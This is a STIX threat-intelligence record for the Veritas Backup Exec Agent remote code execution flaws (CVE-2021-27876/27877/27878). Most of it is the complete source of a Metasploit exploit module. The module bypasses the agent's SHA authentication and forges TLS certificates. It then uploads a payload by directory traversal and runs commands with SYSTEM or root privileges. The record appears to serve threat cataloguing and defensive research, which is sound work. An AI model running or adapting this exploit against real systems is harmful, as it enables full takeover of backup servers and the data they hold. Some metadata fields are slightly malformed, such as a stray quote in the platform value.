{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b8665cf5-4a96-40d4-a2b0-696ef78e0733",
    "created": "2024-08-14T17:06:57.44283Z",
    "modified": "2024-08-14T17:06:57.442834Z",
    "name": "Veritas Backup Exec Agent Remote Code Execution",
    "description": " Veritas Backup Exec Agent supports multiple authentication schemes and SHA authentication is one of them. This authentication scheme is no longer used within Backup Exec versions, but hadn\u2019t yet been disabled. An attacker could remotely exploit the SHA authentication scheme to gain unauthorized access to the BE Agent and execute an arbitrary OS command on the host with NT AUTHORITY\\SYSTEM or root privileges depending on the platform.  The vulnerability presents in 16.x, 20.x and 21.x versions of Backup Exec up to 21.2 (or up to and including Backup Exec Remote Agent revision 9.3)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/veritas/beagent_sha_auth_rce.rb",
            "external_id": "beagent_sha_auth_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-27876"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-27877"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-27878"
        },
        {
            "source_name": "reference",
            "url": "https://www.veritas.com/content/support/en_US/security/VTS21-001"
        }
    ],
    "x_code_snippet": "# frozen_string_literal: true\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::NDMPSocket\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::EXE\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Veritas Backup Exec Agent Remote Code Execution',\n        'Description' => %q{\n          Veritas Backup Exec Agent supports multiple authentication schemes and SHA authentication is one of them.\n          This authentication scheme is no longer used within Backup Exec versions, but hadn\u2019t yet been disabled.\n          An attacker could remotely exploit the SHA authentication scheme to gain unauthorized access to\n          the BE Agent and execute an arbitrary OS command on the host with NT AUTHORITY\\SYSTEM or root privileges\n          depending on the platform.\n\n          The vulnerability presents in 16.x, 20.x and 21.x versions of Backup Exec up to 21.2 (or up to and\n          including Backup Exec Remote Agent revision 9.3)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Alexander Korotin <0xc0rs[at]gmail.com>'],\n        'References' => [\n          ['CVE', '2021-27876'],\n          ['CVE', '2021-27877'],\n          ['CVE', '2021-27878'],\n          ['URL', 'https://www.veritas.com/content/support/en_US/security/VTS21-001']\n        ],\n        'Platform' => %w[win linux],\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'CmdStagerFlavor' => %w[certutil vbs psh_invokewebrequest debug_write debug_asm]\n            }\n          ],\n          [\n            'Linux',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'CmdStagerFlavor' => %w[bourne wget curl echo]\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 10_000\n        },\n        'Privileged' => true,\n        'DisclosureDate' => '2021-03-01',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Reliability' => [UNRELIABLE_SESSION],\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('SHELL', [true, 'The shell for executing OS command', '/bin/bash'],\n                    conditions: ['TARGET', '==', 'Linux'])\n    ])\n    deregister_options('SRVHOST', 'SRVPORT', 'SSL', 'SSLCert', 'URIPATH')\n  end\n\n  def execute_command(cmd, opts = {})\n    case target.opts['Platform']\n    when 'win'\n      wrap_cmd = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \\\"#{cmd}\\\"\"\n    when 'linux'\n      wrap_cmd = \"#{datastore['SHELL']} -c \\\"#{cmd}\\\"\"\n    end\n    ndmp_sock = opts[:ndmp_sock]\n    ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP_EXECUTE_COMMAND,\n        NdmpExecuteCommandReq.new({ cmd: wrap_cmd, unknown: 0 }).to_xdr\n      )\n    )\n  end\n\n  def exploit\n    print_status('Exploiting ...')\n\n    ndmp_status, ndmp_sock, msg_fail_reason = ndmp_connect\n    fail_with(Msf::Module::Failure::NotFound, \"Can not connect to BE Agent service. #{msg_fail_reason}\") unless ndmp_status\n\n    ndmp_status, msg_fail_reason = tls_enabling(ndmp_sock)\n    fail_with(Msf::Module::Failure::UnexpectedReply, \"Can not establish TLS connection. #{msg_fail_reason}\") unless ndmp_status\n\n    ndmp_status, msg_fail_reason = sha_authentication(ndmp_sock)\n    fail_with(Msf::Module::Failure::NotVulnerable, \"Can not authenticate with SHA. #{msg_fail_reason}\") unless ndmp_status\n\n    if target.opts['Platform'] == 'win'\n      filename = \"#{rand_text_alpha(8)}.exe\"\n      ndmp_status, msg_fail_reason = win_write_upload(ndmp_sock, filename)\n      if ndmp_status\n        ndmp_status, msg_fail_reason = exec_win_command(ndmp_sock, filename)\n        fail_with(Msf::Module::Failure::PayloadFailed, \"Can not execute payload. #{msg_fail_reason}\") unless ndmp_status\n      else\n        print_status('Can not upload payload with NDMP_FILE_WRITE packet. Trying to upload with CmdStager')\n        execute_cmdstager({ ndmp_sock: ndmp_sock, linemax: 512 })\n      end\n    else\n      print_status('Uploading payload with CmdStager')\n      execute_cmdstager({ ndmp_sock: ndmp_sock, linemax: 512 })\n    end\n  end\n\n  def check\n    print_status('Checking vulnerability')\n\n    ndmp_status, ndmp_sock, msg_fail_reason = ndmp_connect\n    return Exploit::CheckCode::Unknown(\"Can not connect to BE Agent service. #{msg_fail_reason}\") unless ndmp_status\n\n    print_status('Getting supported authentication types')\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(NDMP::Message::CONFIG_GET_SERVER_INFO)\n    )\n    ndmp_payload = NdmpConfigGetServerInfoRes.from_xdr(ndmp_msg.body)\n    print_status(\"Supported authentication by BE agent: #{ndmp_payload.auth_types.map do |k, _|\n                                                            \"#{AUTH_TYPES[k]} (#{k})\"\n                                                          end.join(', ')}\")\n    print_status(\"BE agent revision: #{ndmp_payload.revision}\")\n\n    if ndmp_payload.auth_types.include?(5)\n      Exploit::CheckCode::Appears('SHA authentication is enabled')\n    else\n      Exploit::CheckCode::Safe('SHA authentication is disabled')\n    end\n  end\n\n  def ndmp_connect\n    print_status('Connecting to BE Agent service')\n    ndmp_msg = nil\n    begin\n      ndmp_sock = NDMP::Socket.new(connect)\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout,\n           Rex::ConnectionRefused => e\n      return [false, nil, e.to_s]\n    end\n    begin\n      Timeout.timeout(datastore['ConnectTimeout']) do\n        ndmp_msg = ndmp_sock.read_ndmp_msg(NDMP::Message::NOTIFY_CONNECTED)\n      end\n    rescue Timeout::Error\n      return [false, nil, 'No NDMP_NOTIFY_CONNECTED (0x502) packet from BE Agent service']\n    else\n      ndmp_payload = NdmpNotifyConnectedRes.from_xdr(ndmp_msg.body)\n    end\n\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP::Message::CONNECT_OPEN,\n        NdmpConnectOpenReq.new({ version: ndmp_payload.version }).to_xdr\n      )\n    )\n\n    ndmp_payload = NdmpConnectOpenRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, ndmp_sock, \"Error code of NDMP_CONNECT_OPEN (0x900) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    [true, ndmp_sock, nil]\n  end\n\n  def tls_enabling(ndmp_sock)\n    print_status('Enabling TLS for NDMP connection')\n    ndmp_tls_certs = NdmpTlsCerts.new('VeritasBE', datastore['RHOSTS'].to_s)\n    ndmp_tls_certs.forge_ca\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP_SSL_HANDSHAKE,\n        NdmpSslHandshakeReq.new(ndmp_tls_certs.default_sslpacket_content(NdmpTlsCerts::SSL_HANDSHAKE_TYPES[:SSL_HANDSHAKE_CSR_REQ])).to_xdr\n      )\n    )\n    ndmp_payload = NdmpSslHandshakeRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, \"Error code of SSL_HANDSHAKE_CSR_REQ (2) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    ndmp_tls_certs.sign_agent_csr(ndmp_payload.data)\n\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP_SSL_HANDSHAKE,\n        NdmpSslHandshakeReq.new(ndmp_tls_certs.default_sslpacket_content(NdmpTlsCerts::SSL_HANDSHAKE_TYPES[:SSL_HANDSHAKE_CSR_SIGNED])).to_xdr\n      )\n    )\n    ndmp_payload = NdmpSslHandshakeRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, \"Error code of SSL_HANDSHAKE_CSR_SIGNED (3) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP_SSL_HANDSHAKE,\n        NdmpSslHandshakeReq.new(ndmp_tls_certs.default_sslpacket_content(NdmpTlsCerts::SSL_HANDSHAKE_TYPES[:SSL_HANDSHAKE_CONNECT])).to_xdr\n      )\n    )\n    ndmp_payload = NdmpSslHandshakeRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, \"Error code of SSL_HANDSHAKE_CONNECT (4) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    ssl_context = OpenSSL::SSL::SSLContext.new\n    ssl_context.add_certificate(ndmp_tls_certs.ca_cert, ndmp_tls_certs.ca_key)\n    ndmp_sock.wrap_with_ssl(ssl_context)\n    [true, nil]\n  end\n\n  def sha_authentication(ndmp_sock)\n    print_status('Passing SHA authentication')\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP_CONFIG_GET_AUTH_ATTR,\n        NdmpConfigGetAuthAttrReq.new({ auth_type: 5 }).to_xdr\n      )\n    )\n    ndmp_payload = NdmpConfigGetAuthAttrRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, \"Error code of NDMP_CONFIG_GET_AUTH_ATTR (0x103) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP::Message::CONNECT_CLIENT_AUTH,\n        NdmpConnectClientAuthReq.new(\n          {\n            auth_type: 5,\n            username: 'Administrator', # Doesn't metter\n            hash: Digest::SHA256.digest(\"\\x00\" * 64 + ndmp_payload.challenge)\n          }\n        ).to_xdr\n      )\n    )\n    ndmp_payload = NdmpConnectClientAuthRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, \"Error code of NDMP_CONECT_CLIENT_AUTH (0x901) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    [true, nil]\n  end\n\n  def win_write_upload(ndmp_sock, filename)\n    print_status('Uploading payload with NDMP_FILE_WRITE packet')\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP_FILE_OPEN_EXT,\n        NdmpFileOpenExtReq.new(\n          {\n            filename: filename,\n            dir: '..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\Temp',\n            mode: 4\n          }\n        ).to_xdr\n      )\n    )\n    ndmp_payload = NdmpFileOpenExtRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, \"Error code of NDMP_FILE_OPEN_EXT (0xf308) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    hnd = ndmp_payload.handler\n    exe = generate_payload_exe\n    offset = 0\n    block_size = 2048\n\n    while offset < exe.length\n      ndmp_msg = ndmp_sock.do_request_response(\n        NDMP::Message.new_request(\n          NDMP_FILE_WRITE,\n          NdmpFileWriteReq.new({ handler: hnd, len: block_size, data: exe[offset, block_size] }).to_xdr\n        )\n      )\n      ndmp_payload = NdmpFileWriteRes.from_xdr(ndmp_msg.body)\n      unless ndmp_payload.err_code.zero?\n        return [false, \"Error code of NDMP_FILE_WRITE (0xF309) packet: #{ndmp_payload.err_code}\"]\n      end\n\n      offset += block_size\n    end\n\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP_FILE_CLOSE,\n        NdmpFileCloseReq.new({ handler: hnd }).to_xdr\n      )\n    )\n    ndmp_payload = NdmpFileCloseRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, \"Error code of NDMP_FILE_CLOSE (0xF306) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    [true, nil]\n  end\n\n  def exec_win_command(ndmp_sock, filename)\n    cmd = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \\\"C:\\\\Windows\\\\Temp\\\\#{filename}\\\"\"\n    ndmp_msg = ndmp_sock.do_request_response(\n      NDMP::Message.new_request(\n        NDMP_EXECUTE_COMMAND,\n        NdmpExecuteCommandReq.new({ cmd: cmd, unknown: 0 }).to_xdr\n      )\n    )\n    ndmp_payload = NdmpExecuteCommandRes.from_xdr(ndmp_msg.body)\n    unless ndmp_payload.err_code.zero?\n      return [false, \"Error code of NDMP_EXECUTE_COMMAND (0xF30F) packet: #{ndmp_payload.err_code}\"]\n    end\n\n    [true, nil]\n  end\n\n  # Class to create CA and client certificates\n  class NdmpTlsCerts\n    def initialize(hostname, ip)\n      @hostname = hostname\n      @ip = ip\n      @ca_key = nil\n      @ca_cert = nil\n      @be_agent_cert = nil\n    end\n\n    SSL_HANDSHAKE_TYPES = {\n      SSL_HANDSHAKE_TEST_CERT: 1,\n      SSL_HANDSHAKE_CSR_REQ: 2,\n      SSL_HANDSHAKE_CSR_SIGNED: 3,\n      SSL_HANDSHAKE_CONNECT: 4\n    }.freeze\n\n    attr_reader :ca_cert, :ca_key\n\n    def forge_ca\n      @ca_key = OpenSSL::PKey::RSA.new(2048)\n      @ca_cert = OpenSSL::X509::Certificate.new\n      @ca_cert.version = 2\n      @ca_cert.serial = rand(2**32..2**64 - 1)\n      @ca_cert.subject = @ca_cert.issuer = OpenSSL::X509::Name.parse(\"/CN=#{@hostname}\")\n      extn_factory = OpenSSL::X509::ExtensionFactory.new(@ca_cert, @ca_cert)\n      @ca_cert.extensions = [\n        extn_factory.create_extension('subjectKeyIdentifier', 'hash'),\n        extn_factory.create_extension('basicConstraints', 'CA:TRUE'),\n        extn_factory.create_extension('keyUsage', 'keyCertSign, cRLSign')\n      ]\n      @ca_cert.add_extension(extn_factory.create_extension('authorityKeyIdentifier', 'keyid:always'))\n      @ca_cert.public_key = @ca_key.public_key\n      @ca_cert.not_before = Time.now - 7 * 60 * 60 * 24\n      @ca_cert.not_after = Time.now + 14 * 24 * 60 * 60\n      @ca_cert.sign(@ca_key, OpenSSL::Digest.new('SHA256'))\n    end\n\n    def sign_agent_csr(csr)\n      o_csr = OpenSSL::X509::Request.new(csr)\n      @be_agent_cert = OpenSSL::X509::Certificate.new\n      @be_agent_cert.version = 2\n      @be_agent_cert.serial = rand(2**32..2**64 - 1)\n      @be_agent_cert.not_before = Time.now - 7 * 60 * 60 * 24\n      @be_agent_cert.not_after = Time.now + 14 * 24 * 60 * 60\n      @be_agent_cert.issuer = @ca_cert.subject\n      @be_agent_cert.subject = o_csr.subject\n      @be_agent_cert.public_key = o_csr.public_key\n      @be_agent_cert.sign(@ca_key, OpenSSL::Digest.new('SHA256'))\n    end\n\n    def default_sslpacket_content(ssl_packet_type)\n      if ssl_packet_type == SSL_HANDSHAKE_TYPES[:SSL_HANDSHAKE_CSR_SIGNED]\n        ca_cert = @ca_cert.to_s\n        agent_cert = @be_agent_cert.to_s\n      else\n        ca_cert = ''\n        agent_cert = ''\n      end\n      {\n        ssl_packet_type: ssl_packet_type,\n        hostname: @hostname,\n        nb_hostname: @hostname.upcase,\n        ip_addr: @ip,\n        cert_id1: get_cert_id(@ca_cert),\n        cert_id2: get_cert_id(@ca_cert),\n        unknown1: 0,\n        unknown2: 0,\n        ca_cert_len: ca_cert.length,\n        ca_cert: ca_cert,\n        agent_cert_len: agent_cert.length,\n        agent_cert: agent_cert\n      }\n    end\n\n    def get_cert_id(cert)\n      Digest::SHA1.digest(cert.issuer.to_s + cert.serial.to_s(2))[0...4].unpack1('L<')\n    end\n  end\n\n  NDMP_CONFIG_GET_AUTH_ATTR = 0x103\n  NDMP_SSL_HANDSHAKE = 0xf383\n  NDMP_EXECUTE_COMMAND = 0xf30f\n  NDMP_FILE_OPEN_EXT = 0xf308\n  NDMP_FILE_WRITE = 0xF309\n  NDMP_FILE_CLOSE = 0xF306\n\n  AUTH_TYPES = {\n    1 => 'Text',\n    2 => 'MD5',\n    3 => 'BEWS',\n    4 => 'SSPI',\n    5 => 'SHA',\n    190 => 'BEWS2' # 0xBE\n  }.freeze\n\n  # Responce packets\n  class NdmpNotifyConnectedRes < XDR::Struct\n    attribute :connected, XDR::Int\n    attribute :version, XDR::Int\n    attribute :reason, XDR::Int\n  end\n\n  class NdmpConnectOpenRes < XDR::Struct\n    attribute :err_code, XDR::Int\n  end\n\n  class NdmpConfigGetServerInfoRes < XDR::Struct\n    attribute :err_code, XDR::Int\n    attribute :vendor_name, XDR::String[]\n    attribute :product_name, XDR::String[]\n    attribute :revision, XDR::String[]\n    attribute :auth_types, XDR::VarArray[XDR::Int]\n  end\n\n  class NdmpConfigGetHostInfoRes < XDR::Struct\n    attribute :err_code, XDR::Int\n    attribute :hostname, XDR::String[]\n    attribute :os, XDR::String[]\n    attribute :os_info, XDR::String[]\n    attribute :ip, XDR::String[]\n  end\n\n  class NdmpSslHandshakeRes < XDR::Struct\n    attribute :data_len, XDR::Int\n    attribute :data, XDR::String[]\n    attribute :err_code, XDR::Int\n    attribute :unknown4, XDR::String[]\n  end\n\n  class NdmpConfigGetAuthAttrRes < XDR::Struct\n    attribute :err_code, XDR::Int\n    attribute :auth_type, XDR::Int\n    attribute :challenge, XDR::Opaque[64]\n  end\n\n  class NdmpConnectClientAuthRes < XDR::Struct\n    attribute :err_code, XDR::Int\n  end\n\n  class NdmpExecuteCommandRes < XDR::Struct\n    attribute :err_code, XDR::Int\n  end\n\n  class NdmpFileOpenExtRes < XDR::Struct\n    attribute :err_code, XDR::Int\n    attribute :handler, XDR::Int\n  end\n\n  class NdmpFileWriteRes < XDR::Struct\n    attribute :err_code, XDR::Int\n    attribute :recv_len, XDR::Int\n    attribute :unknown, XDR::Int\n  end\n\n  class NdmpFileCloseRes < XDR::Struct\n    attribute :err_code, XDR::Int\n  end\n\n  # Request packets\n  class NdmpConnectOpenReq < XDR::Struct\n    attribute :version, XDR::Int\n  end\n\n  class NdmpSslHandshakeReq < XDR::Struct\n    attribute :ssl_packet_type, XDR::Int\n    attribute :nb_hostname, XDR::String[]\n    attribute :hostname, XDR::String[]\n    attribute :ip_addr, XDR::String[]\n    attribute :cert_id1, XDR::Int\n    attribute :cert_id2, XDR::Int\n    attribute :unknown1, XDR::Int\n    attribute :unknown2, XDR::Int\n    attribute :ca_cert_len, XDR::Int\n    attribute :ca_cert, XDR::String[]\n    attribute :agent_cert_len, XDR::Int\n    attribute :agent_cert, XDR::String[]\n  end\n\n  class NdmpConfigGetAuthAttrReq < XDR::Struct\n    attribute :auth_type, XDR::Int\n  end\n\n  class NdmpConnectClientAuthReq < XDR::Struct\n    attribute :auth_type, XDR::Int\n    attribute :username, XDR::String[]\n    attribute :hash, XDR::Opaque[32]\n  end\n\n  class NdmpExecuteCommandReq < XDR::Struct\n    attribute :cmd, XDR::String[]\n    attribute :unknown, XDR::Int\n  end\n\n  class NdmpFileOpenExtReq < XDR::Struct\n    attribute :filename, XDR::String[]\n    attribute :dir, XDR::String[]\n    attribute :mode, XDR::Int\n  end\n\n  class NdmpFileWriteReq < XDR::Struct\n    attribute :handler, XDR::Int\n    attribute :len, XDR::Int\n    attribute :data, XDR::String[]\n  end\n\n  class NdmpFileCloseReq < XDR::Struct\n    attribute :handler, XDR::Int\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-03-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}